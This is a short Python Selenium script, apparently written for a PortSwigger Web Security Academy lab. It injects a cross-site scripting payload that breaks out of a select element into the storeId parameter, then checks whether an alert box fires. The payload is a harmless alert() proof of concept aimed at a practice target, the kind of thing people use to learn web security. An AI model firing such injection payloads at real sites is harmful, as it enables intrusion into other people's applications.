from selenium import webdriver
from selenium.webdriver.edge.options import Options
import time

url = "https://0a2d002f03053241802a038a00770048.web-security-academy.net/"
payload = "</select><img src=c onerror=alert()>"

driver = webdriver.Edge()
driver.get(f"{url}product?productId=1&storeId={payload}")

time.sleep(2)

try:
    alert = driver.switch_to.alert
    print("psotive")
    alert.accept()
except:
    print("negatif")
driver.quit()
